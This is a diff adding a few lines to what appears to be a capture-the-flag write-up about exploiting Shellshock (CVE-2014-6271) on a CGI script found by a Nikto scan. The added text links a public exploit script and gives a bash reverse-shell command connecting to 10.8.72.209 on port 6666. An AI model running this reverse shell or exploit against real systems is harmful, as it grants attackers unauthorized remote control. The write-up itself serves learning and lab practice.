@@ -83,3 +83,10 @@ And i found there is a vuln ShellShock in the\
 + /cgi-bin/test.cgi: Uncommon header '93e4r0-cve-2014-6278' found, with contents: true.
 + /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
 ```
+
+We can use a python script to exploit the vuln https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Shellshock%20CVE-2014-6271.py\
+Then we got somehow a basic shell where we need to use the binaries with full path\
+So we can get a shell with this command\
+```bash
+/bin/bash -i >& /dev/tcp/10.8.72.209/6666 0>&1
+```
